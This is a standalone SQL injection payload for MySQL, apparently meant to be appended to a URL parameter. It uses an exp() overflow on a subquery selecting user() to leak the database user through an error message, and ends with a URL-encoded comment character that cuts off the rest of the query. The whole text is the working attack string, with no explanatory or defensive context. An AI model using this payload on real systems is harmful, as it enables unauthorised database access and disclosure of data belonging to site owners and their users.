and exp(
    ~(
        select * from (
            select user()
        )x
    )
)%23